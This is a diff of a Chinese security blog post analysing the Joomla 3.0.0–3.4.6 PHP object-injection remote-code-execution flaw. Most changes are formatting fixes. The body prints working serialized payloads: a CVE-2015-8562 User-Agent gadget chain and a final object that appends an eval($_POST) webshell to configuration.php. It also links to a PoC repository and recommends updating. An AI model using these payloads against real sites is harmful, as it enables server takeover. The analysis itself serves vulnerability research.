@@ -84,7 +84,7 @@
 <meta name="description" content="Author：Ja0k #事件背景上周，意大利安全公司 Hacktive Security的研究员 AlessandroGroppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-">
 <meta name="keywords" content="Web安全,漏洞分析,对象注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造">
+<meta property="og:title" content="漏洞分析-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造">
 <meta property="og:url" content="https://securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/index.html">
 <meta property="og:site_name" content="SecurityCN&#39;s blog">
 <meta property="og:description" content="Author：Ja0k #事件背景上周，意大利安全公司 Hacktive Security的研究员 AlessandroGroppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-">
@@ -104,9 +104,10 @@
 <meta property="og:image" content="https://securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-05-03.png">
 <meta property="og:image" content="https://securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-17-35-50.png">
 <meta property="og:image" content="https://securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-22-27-37.png">
-<meta property="og:updated_time" content="2019-10-10T01:59:38.208Z">
+<meta property="og:image" content="https://securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-23-26-30.png">
+<meta property="og:updated_time" content="2019-10-10T02:03:34.522Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造">
+<meta name="twitter:title" content="漏洞分析-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造">
 <meta name="twitter:description" content="Author：Ja0k #事件背景上周，意大利安全公司 Hacktive Security的研究员 AlessandroGroppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-">
 <meta name="twitter:image" content="https://securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/fd87976bb0347e8a60d5929c0cd96b58.jpg">
 
@@ -144,7 +145,7 @@
 
 
 
-  <title>漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造 | SecurityCN's blog</title>
+  <title>漏洞分析-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造 | SecurityCN's blog</title>
   
 
 
@@ -330,7 +331,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造</h1>
+          <h1 class="post-title" itemprop="name headline">漏洞分析-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造</h1>
         
 
         <div class="post-meta">
@@ -407,7 +408,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  2.9k
+                  3k
                 </span>
               
 
@@ -423,7 +424,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  13
+                  14
                 </span>
               
             </div>
@@ -487,52 +488,42 @@
 
 <h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="#漏洞分析"></a>#漏洞分析</h3><p>这个漏洞是和Joomla的会话的运作机制有关，Joomla 会话以 PHP Objects 的形式存储在数据库中且由 PHP 会话函数处理，但是由于Mysql无法保存Null 字节，函数在将session写入数据库和读取时会对象因大小不正确而导致不合法从而溢出。因为未认证用户的会话也可存储，所以该对象注入 (Object Injection) 可以在未登录认证的情况下攻击成功，导致RCE。</p>
 <p><strong>1.溢出</strong><br>当我们在 Joomla中执行 POST 请求时，通常会有303重定向将我们重定向至结果页。这是利用的重要事项，因为第一个请求（含参数）将只会导致 Joomla 执行动作并存储（例如调用write() 函数）会话，之后303重定向将进行检索（如调用read() 函数）并将信息显示给用户。</p>
-<p>漏洞利用文件<br>‘libraries/joomla/session/storage/database.php’中定义的函数 read()和 write()由session_set_save_handler()设置，作为‘libraries/joomla/session/session.php:__start’ session_start() 调用的读和写处理程序。<br>由于Mysql无法保存Null 字节，libraries/joomla/session/storage/database.php的write函数在将数据存储到数据库之前（write函数）会用‘\0\0\0’替换‘\x00\x2a\x00’(chr(0).’<em>’.chr(0))，而在序列化对象中， $protected 变量被赋予‘\x00\x2a\x00’前缀。<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-17-35-50.png" alt><br>当读取数据库中的数据时， read 函数会用‘\x00\x2a\x00’（N</em>N）替换‘\0\0\0’，重构原始对象。<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-22-27-37.png" alt><br>这种替换的主要问题在于它用3个字节替换了6个字节。这种代码在Joomla3.0.0到3.4.6 版本中一直存在。从 3.4.7 版本开始，会话是 base64 编码形式存储在数据库中。<br>如之前所述，我们能够通过动作参数的读取和写入来操纵该会话对象进行注入将被3个字节替换的‘\0\0\0’，导致对象因大小不正确（字节长度不同）导致不合法，造成溢出。<br><strong>举个栗子</strong><br>比如一个登录表单，在 username 字段中放入‘my\x00\x2a\x00username’，经过write函数处理后将在数据库中得到如下对象：  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:16:&quot;my\0\0\0username&quot;</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">当该会话对象被 read 函数中读取时，‘\0\0\0’将被以如上所述方式所替代，得到如下值：</span><br></pre></td></tr></table></figure>
+<p>漏洞利用文件<br>‘libraries/joomla/session/storage/database.php’中定义的函数 read()和 write()由session_set_save_handler()设置，作为‘libraries/joomla/session/session.php:__start’ session_start() 调用的读和写处理程序。<br>由于Mysql无法保存Null 字节，libraries/joomla/session/storage/database.php的write函数在将数据存储到数据库之前（write函数）会用‘\0\0\0’替换‘\x00\x2a\x00’(chr(0).’<em>’.chr(0))，而在序列化对象中， $protected 变量被赋予‘\x00\x2a\x00’前缀。<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-17-35-50.png" alt><br>当读取数据库中的数据时， read 函数会用‘\x00\x2a\x00’（N</em>N）替换‘\0\0\0’，重构原始对象。<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-22-27-37.png" alt><br>这种替换的主要问题在于它用3个字节替换了6个字节。这种代码在Joomla3.0.0到3.4.6 版本中一直存在。从 3.4.7 版本开始，会话是 base64 编码形式存储在数据库中。<br>如之前所述，我们能够通过动作参数的读取和写入来操纵该会话对象进行注入将被3个字节替换的‘\0\0\0’，导致对象因大小不正确（字节长度不同）导致不合法，造成溢出。<br><strong>举个栗子</strong><br>比如一个登录表单，在 username 字段中放入‘my\x00\x2a\x00username’，经过write函数处理后将在数据库中得到如下对象:  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:16:&quot;my\0\0\0username&quot;</span><br></pre></td></tr></table></figure>
 
-<p>s:8:s:”username”;s:16:”myN*Nusername” –&gt;不合法的大小<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">被替换的字符串只有13个字节长，但生命的字符串长度仍然是16个字节！</span><br><span class="line">就可以愉快地利用这种“溢出”构造一个可以实现 RCE 的一个新的对象，在可以控制反序列化对象以后，我们只需构造一个能够一步步调用的执行链，即可进行一些危险的操作了。</span><br><span class="line">在本次曝光的Poc中就是用username字段进行溢出，password字段进行对象注入，如果插入任意serialize字符串，构造反序列化漏洞了，到这里就和之前的漏洞CVE-2015-8562的比较相似了。</span><br><span class="line"></span><br><span class="line">**2. 对象注入（反序列化）**  (本部分参考PHITHON的博客)</span><br><span class="line">CVE-2015-8562的Poc如下</span><br></pre></td></tr></table></figure></p>
-<p>User-Agent: 123}__test|O:21:”JDatabaseDriverMysqli”:3:{s:4:”\0\0\0a”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:5:”cache”;b:1;s:19:”cache_name_function”;s:6:”assert”;s:10:”javascript”;i:9999;s:8:”feed_url”;s:37:”phpinfo();JFactory::getConfig();exit;”;}i:1;s:4:”init”;}}s:13:”\0\0\0connection”;i:1;}4</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在这个执行链中，分别利用了如下类：</span><br><span class="line">JDatabaseDriverMysqli</span><br><span class="line">SimplePie</span><br><span class="line"></span><br><span class="line">**2.1 JDatabaseDriverMysqli类**  </span><br><span class="line">我们可以在JDatabaseDriverMysqli类的析构函数里找到一处敏感操作：</span><br></pre></td></tr></table></figure>
+<p>当该会话对象被 read 函数中读取时，‘\0\0\0’将被以如上所述方式所替代，得到如下值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:16:&quot;myN*Nusername&quot; --&gt;不合法的大小</span><br></pre></td></tr></table></figure>
 
-<p>&lt;?php<br>public function __destruct()<br>    {<br>        $this-&gt;disconnect();<br>    }<br>    …<br>    public function disconnect()<br>    {<br>        // Close the connection.<br>        if ($this-&gt;connection)<br>        {<br>            foreach ($this-&gt;disconnectHandlers as $h)<br>            {<br>                call_user_func_array($h, array( &amp;$this));<br>            }</p>
-<pre><code>        mysqli_close($this-&gt;connection);
-    }
+<p>被替换的字符串只有13个字节长，但生命的字符串长度仍然是16个字节！<br>就可以愉快地利用这种“溢出”构造一个可以实现 RCE 的一个新的对象，在可以控制反序列化对象以后，我们只需构造一个能够一步步调用的执行链，即可进行一些危险的操作了。<br>在本次曝光的Poc中就是用username字段进行溢出，password字段进行对象注入，如果插入任意serialize字符串，构造反序列化漏洞了，到这里就和之前的漏洞CVE-2015-8562的比较相似了。</p>
+<p><strong>2. 对象注入（反序列化）</strong>  (本部分参考PHITHON的博客)<br>CVE-2015-8562的Poc如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;4</span><br></pre></td></tr></table></figure>
 
-    $this-&gt;connection = null;
-} </code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">当exp对象反序列化后，将会成为一个JDatabaseDriverMysqli类对象，不管中间如何执行，最后都将会调用__destruct，__destruct将会调用disconnect，disconnect里有一处敏感函数：call_user_func_array。</span><br><span class="line"></span><br><span class="line">但很明显，这里的call_user_func_array的第二个参数，是我们无法控制的。所以不能直接构造assert+eval来执行任意代码。</span><br><span class="line"></span><br><span class="line">于是这里再次调用了一个对象：SimplePie类对象，和它的init方法组成一个回调函数[new SimplePie(), &apos;init&apos;]，传入call_user_func_array。</span><br><span class="line"></span><br><span class="line">跟进init方法：</span><br></pre></td></tr></table></figure>
+<p>在这个执行链中，分别利用了如下类：<br>JDatabaseDriverMysqli<br>SimplePie</p>
+<p><strong>2.1 JDatabaseDriverMysqli类</strong><br>我们可以在JDatabaseDriverMysqli类的析构函数里找到一处敏感操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;disconnect();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    public function disconnect()</span><br><span class="line">    &#123;</span><br><span class="line">        // Close the connection.</span><br><span class="line">        if ($this-&gt;connection)</span><br><span class="line">        &#123;</span><br><span class="line">            foreach ($this-&gt;disconnectHandlers as $h)</span><br><span class="line">            &#123;</span><br><span class="line">                call_user_func_array($h, array( &amp;$this));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            mysqli_close($this-&gt;connection);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;connection = null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p>&lt;?php<br>function init()<br>    {<br>        // Check absolute bare minimum requirements.<br>        if ((function_exists(‘version_compare’) &amp;&amp; version_compare(PHP_VERSION, ‘4.3.0’, ‘&lt;’)) || !extension_loaded(‘xml’) || !extension_loaded(‘pcre’))<br>        {<br>            return false;<br>        }<br>        …<br>        if ($this-&gt;feed_url !== null || $this-&gt;raw_data !== null)<br>        {<br>            $this-&gt;data = array();<br>            $this-&gt;multifeed_objects = array();<br>            $cache = false;</p>
-<pre><code>if ($this-&gt;feed_url !== null)
-{
-    $parsed_feed_url = SimplePie_Misc::parse_url($this-&gt;feed_url);
-    // Decide whether to enable caching
-    if ($this-&gt;cache &amp;&amp; $parsed_feed_url[&apos;scheme&apos;] !== &apos;&apos;)
-    {
-        $cache = call_user_func(array($this-&gt;cache_class, &apos;create&apos;), $this-&gt;cache_location, call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url), &apos;spc&apos;);</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">很明显，其中这两个call_user_func将是触发代码执行的元凶。</span><br><span class="line"></span><br><span class="line">所以，可以将其中第二个call_user_func的第一个参数cache_name_function，赋值为assert，第二个参数赋值为我需要执行的代码，就构造好了一个『回调后门』。</span><br><span class="line"></span><br><span class="line">**2.2 SimplePie类**  </span><br><span class="line">默认情况下SimplePie是没有定义的，这也是为什么我在调用SimplePie之前先new了一个JSimplepieFactory的原因，因为JSimplepieFactory对象在加载时会调用import函数将SimplePie导入到当前工作环境：  </span><br><span class="line">![](漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-23-26-30.png)</span><br><span class="line">而JSimplepieFactory有autoload，所以不再需要其他include来对其进行加载。</span><br><span class="line">P牛的Poc</span><br></pre></td></tr></table></figure>
+<p>当exp对象反序列化后，将会成为一个JDatabaseDriverMysqli类对象，不管中间如何执行，最后都将会调用<strong>destruct，</strong>destruct将会调用disconnect，disconnect里有一处敏感函数：call_user_func_array。</p>
+<p>但很明显，这里的call_user_func_array的第二个参数，是我们无法控制的。所以不能直接构造assert+eval来执行任意代码。</p>
+<p>于是这里再次调用了一个对象：SimplePie类对象，和它的init方法组成一个回调函数[new SimplePie(), ‘init’]，传入call_user_func_array。</p>
+<p>跟进init方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function init()</span><br><span class="line">    &#123;</span><br><span class="line">        // Check absolute bare minimum requirements.</span><br><span class="line">        if ((function_exists(&apos;version_compare&apos;) &amp;&amp; version_compare(PHP_VERSION, &apos;4.3.0&apos;, &apos;&lt;&apos;)) || !extension_loaded(&apos;xml&apos;) || !extension_loaded(&apos;pcre&apos;))</span><br><span class="line">        &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        if ($this-&gt;feed_url !== null || $this-&gt;raw_data !== null)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;data = array();</span><br><span class="line">            $this-&gt;multifeed_objects = array();</span><br><span class="line">            $cache = false;</span><br><span class="line"></span><br><span class="line">            if ($this-&gt;feed_url !== null)</span><br><span class="line">            &#123;</span><br><span class="line">                $parsed_feed_url = SimplePie_Misc::parse_url($this-&gt;feed_url);</span><br><span class="line">                // Decide whether to enable caching</span><br><span class="line">                if ($this-&gt;cache &amp;&amp; $parsed_feed_url[&apos;scheme&apos;] !== &apos;&apos;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $cache = call_user_func(array($this-&gt;cache_class, &apos;create&apos;), $this-&gt;cache_location, call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url), &apos;spc&apos;);</span><br></pre></td></tr></table></figure>
 
-<p>O:21:”JDatabaseDriverMysqli”:3:{s:4:”\0\0\0a”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:5:”cache”;b:1;s:19:”cache_name_function”;s:6:”assert”;s:10:”javascript”;i:9999;s:8:”feed_url”;s:37:”phpinfo();JFactory::getConfig();exit;”;}i:1;s:4:”init”;}}s:13:”\0\0\0connection”;i:1;}ð</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前面讲过由于Joomla的会话机制Post请求会被303重定向到结果页面所以无法回显,这里的phpinfo函数就用不了</span><br><span class="line">选择用file_put_contents函数写入一句话到configuration.php中</span><br></pre></td></tr></table></figure>
+<p>很明显，其中这两个call_user_func将是触发代码执行的元凶。</p>
+<p>所以，可以将其中第二个call_user_func的第一个参数cache_name_function，赋值为assert，第二个参数赋值为我需要执行的代码，就构造好了一个『回调后门』。</p>
+<p><strong>2.2 SimplePie类</strong><br>默认情况下SimplePie是没有定义的，这也是为什么我在调用SimplePie之前先new了一个JSimplepieFactory的原因，因为JSimplepieFactory对象在加载时会调用import函数将SimplePie导入到当前工作环境：<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-23-26-30.png" alt><br>而JSimplepieFactory有autoload，所以不再需要其他include来对其进行加载。<br>P牛的Poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;ð</span><br></pre></td></tr></table></figure>
 
-<p>file_put_contents(‘configuration.php’,’if(isset($_POST[\&#39;test\&#39;])) eval($_POST[\&#39;test\&#39;]);&#39;, FILE_APPEND) || $a=&#39;<a href="http://wtf\&#39;" target="_blank" rel="noopener">http://wtf\&#39;</a>;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最终的对象如下：</span><br></pre></td></tr></table></figure>
+<p>前面讲过由于Joomla的会话机制Post请求会被303重定向到结果页面所以无法回显,这里的phpinfo函数就用不了<br>选择用file_put_contents函数写入一句话到configuration.php中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&apos;configuration.php&apos;,&apos;if(isset($_POST[\\\&apos;test\\\&apos;])) eval($_POST[\\\&apos;test\\\&apos;]);\&apos;, FILE_APPEND) || $a=\&apos;http://wtf\&apos;;</span><br></pre></td></tr></table></figure>
 
-<p>AAA”;s:11:”maonnalezzo”:O:21:”JDatabaseDriverMysqli”:3:{s:4:”\0\0\0a”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:5:”cache”;b:1;s:19:”cache_name_function”;s:6:”assert”;s:10:”javascript”;i:9999;s:8:”feed_url”;s:217:”file_put_contents(‘configuration.php’,’if(isset($_POST[&#39;ja0k&#39;]))+eval($_POST[&#39;ja0k&#39;]);’,+FILE_APPEND)+||+$a=’<a href="http://wtf&#39;;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\0\0\0connection&quot;;i:1;}s:6:&quot;return&quot;;s:102" target="_blank" rel="noopener">http://wtf&#39;;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\0\0\0connection&quot;;i:1;}s:6:&quot;return&quot;;s:102</a>:</p>
-<pre><code>
+<p>最终的对象如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAA&quot;;s:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:217:&quot;file_put_contents(&apos;configuration.php&apos;,&apos;if(isset($_POST[\&apos;ja0k\&apos;]))+eval($_POST[\&apos;ja0k\&apos;]);&apos;,+FILE_APPEND)+||+$a=&apos;http://wtf&apos;;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;s:6:&quot;return&quot;;s:102:</span><br></pre></td></tr></table></figure>
 
-### \#修复建议
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="#修复建议"></a>#修复建议</h3><p>更新至最新版本<br>官方地址<a href="https://downloads.joomla.org" target="_blank" rel="noopener">https://downloads.joomla.org</a></p>
+<p><strong>代码及工具下载：</strong><br><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE</a></p>
+<p><strong>免责声明：本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</strong></p>
+<p>参考：<br>[1].<a href="https://cxsecurity.com/issue/WLB-2019100045" target="_blank" rel="noopener">https://cxsecurity.com/issue/WLB-2019100045</a><br>[2].<a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html</a><br>[3].<a href="https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA</a> </p>
 
-更新至最新版本  
-官方地址https://downloads.joomla.org
-
-**代码及工具下载：**  
-https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE
-
-**免责声明：本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。**
-
-参考：  
-[1].https://cxsecurity.com/issue/WLB-2019100045  
-[2].https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html  
-[3].https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA </code></pre>
       
     </div>
     
@@ -562,7 +553,7 @@ https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/" title="漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造">https://securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/</a>
+    <a href="https://securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/" title="漏洞分析-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造">https://securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -766,7 +757,7 @@ https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.
           </li>
         
           <li>
-            <a href="/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/" title="漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造" target="_blank">漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造</a>
+            <a href="/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/" title="漏洞分析-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造" target="_blank">漏洞分析-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造</a>
           </li>
         
           <li>
@@ -800,7 +791,7 @@ https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#事件背景"><span class="nav-number">1.</span> <span class="nav-text">#事件背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影响范围"><span class="nav-number">2.</span> <span class="nav-text">#影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">#漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp攻击链分析"><span class="nav-number">4.</span> <span class="nav-text">#Exp攻击链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">5.</span> <span class="nav-text">#漏洞分析</span></a></li></ol></div>
